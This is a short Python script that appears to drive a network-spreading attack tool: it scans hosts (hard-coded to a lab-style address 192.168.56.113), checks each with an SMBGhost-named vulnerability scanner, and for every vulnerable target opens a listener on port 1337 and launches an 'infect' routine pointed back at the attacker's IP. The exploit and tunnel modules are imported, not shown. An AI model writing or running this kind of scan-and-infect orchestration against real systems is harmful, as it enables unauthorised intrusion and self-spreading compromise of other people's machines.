import sys
import time
import armory.SMBGhost.cve20220796scanner as cve20220796scanner
from sniff import sniff
from infect import infect
from tunnel import tunnel
import sqlite3


def main(ip_range):
    targets = ip_range
    targets = '192.168.56.113'
    network = sniff(targets)
    for local_ip, target_ips in network.get_host_networks().items():
        for target_ip in target_ips:
            target_port_details = network.get_host_port_details(target_ip.address)
            con = sqlite3.connect("armory/record.db")
            cur = con.cursor()
            for running_port in target_port_details[target_ip.address]["ports"]:
                #attack = network.is_vulnerable(cur,each_port)
                attack = cve20220796scanner.is_vulnerable(target_ip.address)
                if attack:
                    listening_port = 1337
                    tunnel = tunnel("0.0.0.0", listening_port)
                    tunnel.start()
                    
                    infection = infect(target_ip.address,running_port, local_ip, listening_port)
                    infection.start()
            con.close()
            print(target_port_details)

if __name__=='__main__':
    #ip_range = sys.argv[1]
    ip_range=2
    main(ip_range)